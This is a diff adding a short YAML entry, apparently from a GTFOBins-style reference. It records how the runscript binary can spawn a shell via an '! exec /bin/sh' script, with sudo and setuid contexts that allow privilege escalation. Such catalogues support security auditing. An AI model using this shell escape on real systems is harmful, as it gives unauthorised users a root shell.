@@ -1,0 +1,12 @@
+---
+functions:
+  shell:
+  - code: |-
+      echo '! exec /bin/sh' >/path/to/temp-file
+      runscript /path/to/temp-file
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
